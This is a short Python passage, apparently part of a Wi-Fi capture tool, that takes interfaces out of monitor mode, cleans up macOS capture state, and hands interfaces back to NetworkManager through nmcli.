    for iface in _monitor_interfaces():
        _exit_monitor(iface)
    if _IS_MACOS:
        try:
            from . import wifi_macos
            wifi_macos.cleanup_capture()
        except Exception:
            pass
    else:
        for iface in wifi_interfaces():
            _run(["nmcli", "device", "set", iface, "managed", "yes"])
